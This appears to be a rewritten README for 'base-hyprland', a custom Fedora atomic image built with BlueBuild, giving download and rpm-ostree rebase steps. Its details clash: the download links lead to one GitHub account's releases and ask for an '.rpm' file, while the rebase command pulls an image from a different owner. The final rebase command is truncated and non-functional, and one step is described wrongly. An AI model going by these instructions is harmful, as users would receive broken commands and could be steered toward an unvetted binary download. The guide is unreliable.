---
layout: "default"
title: "🌟 base-hyprland - A Simple Way to Update Your Fedora System"
description: "🌐 Streamline your Fedora setup with base-hyprland, a template for creating custom images using BlueBuild for efficient image management."
---
# 🌟 base-hyprland - A Simple Way to Update Your Fedora System

## 🖱️ Download the Software
[![Download base-hyprland](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/ali-maiga/base-hyprland/releases)

## 🚀 Getting Started
Welcome to base-hyprland. This guide helps you download and run our software with ease. Follow the steps below to update your Fedora installation successfully.

## 📥 Download & Install
1. Visit the [Releases page](https://github.com/ali-maiga/base-hyprland/releases) to find the latest version of base-hyprland.  
2. Look for the latest release and download the appropriate file for your system. Choose the file ending in `.rpm` for Fedora.
3. Once the download is complete, open a terminal. You can find it in your applications menu.

## 🔄 Update Your System
To update your existing Fedora installation, follow these steps carefully.

### Step 1: Rebase to Unsigned Image
Run the following command in the terminal to rebase to the unsigned image. This step installs the required signing keys and policies for your system.

```bash
rpm-ostree rebase ostree-unverified-registry:ghcr.io/dominikma/base-hyprland:latest
```

### Step 2: Reboot Your System
After the rebase command runs successfully, reboot your system to complete the process:

```bash
systemctl reboot
```

### Step 3: Rebase to Signed Image
Once your system is back up, run this command to finish the update process by rebasing to the signed image:

```bash
rpm-ostree rebase ostree-image-si
```

## 🛠️ System Requirements
- **Operating System:** This application is designed for Fedora-based systems.
- **Hardware Requirements:** 
  - A minimum of 2 GB RAM is recommended.
  - At least 10 GB of free disk space for proper installation.
  - A compatible CPU: Intel or AMD.

## 📁 Troubleshooting
If you encounter issues during the installation or update, consider the following tips:

- Make sure your Fedora installation is updated before you start.
- Ensure you have administrator rights to run the update commands.
- If the terminal gives any error messages, copy them down. They can help in finding a solution.

## 🌐 Support and Documentation
For more detailed instructions or documentation, visit the BlueBuild documentation at [BlueBuild docs](https://blue-build.org/how-to/setup/). This resource provides guidance on setting up and customizing your repository.

## ⚙️ Topics
This project covers various topics including:
- atomic
- bluebuild
- bluebuild-image
- custom-image
- image-based
- immutable
- linux
- linux-custom-image
- oci
- oci-image
- operating-system

Feel free to explore these topics to learn more about how base-hyprland operates.

## 📋 Acknowledgments
Thanks for using base-hyprland. We aim to make your Fedora experience smoother and more efficient. Enjoy the updates!